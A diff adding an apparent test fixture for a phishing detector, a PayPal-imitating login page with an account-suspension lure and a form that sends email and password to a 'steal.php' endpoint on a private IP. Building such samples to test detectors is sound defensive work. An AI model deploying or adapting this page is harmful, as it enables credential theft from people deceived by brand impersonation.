@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PayPal - Log in to your account</title>
+</head>
+<body>
+<!-- TEST FILE: Phishing page -->
+<!-- This should trigger: phishing detector -->
+
+<div class="login-container">
+    <img src="paypal-logo.png" alt="PayPal">
+    <h1>Log in to PayPal</h1>
+
+    <form action="http://192.168.1.100/steal.php" method="POST">
+        <input type="text" name="email" placeholder="Email">
+        <input type="password" name="password" placeholder="Password">
+        <button type="submit">Log In</button>
+    </form>
+
+    <p>Your account has been suspended due to unusual activity.</p>
+    <p>Please verify your identity to restore access.</p>
+</div>
+
+</body>
+</html>
